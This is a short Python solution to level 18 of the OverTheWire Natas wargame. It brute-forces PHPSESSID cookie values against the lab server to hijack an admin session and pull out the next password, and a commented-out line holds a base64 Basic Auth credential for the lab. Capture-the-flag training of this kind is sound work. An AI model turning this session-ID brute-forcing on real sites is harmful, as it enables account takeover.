import requests
import re
from requests.auth import HTTPBasicAuth
def solve18(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    #session.headers["Authorization"] = "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="
    session.auth = HTTPBasicAuth(username, password)
    def getURL(id):
        session.cookies["PHPSESSID"] = str(id)
        return f"http://natas18.natas.labs.overthewire.org/index.php"


    for i in range(1, 641):
        resp = session.get(getURL(i))
        if len(resp.content) > 1000:
            pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
            return pw